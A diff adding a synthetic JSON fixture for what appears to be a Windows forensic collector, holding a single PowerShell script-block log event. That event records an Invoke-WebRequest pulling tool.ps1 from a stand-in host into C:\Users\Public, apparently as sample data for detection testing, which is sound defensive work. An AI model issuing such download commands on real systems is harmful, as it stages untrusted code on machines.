@@ -1,0 +1,12 @@
+{
+  "schema_version": "1.0",
+  "scanner": {"name": "Synthetic collector", "version": "0.0.0", "collected_at_utc": "2026-07-14T00:00:00Z", "hostname": "POWERSHELL-LAB"},
+  "collection": {"lookback_days": 14},
+  "artifacts": {
+    "installed_programs": [], "services": [], "service_install_events": [], "scheduled_tasks": [],
+    "startup_registry": [], "startup_folders": [], "recent_files": [], "defender_events": [],
+    "powershell_events": [{"log_name": "Microsoft-Windows-PowerShell/Operational", "id": 4104, "time_created_utc": "2026-07-14T00:00:00Z", "message": "Invoke-WebRequest -Uri https://example.test/tool.ps1 -OutFile C:\\Users\\Public\\tool.ps1"}],
+    "process_creation_events": [], "wmi_events": []
+  },
+  "collection_errors": []
+}
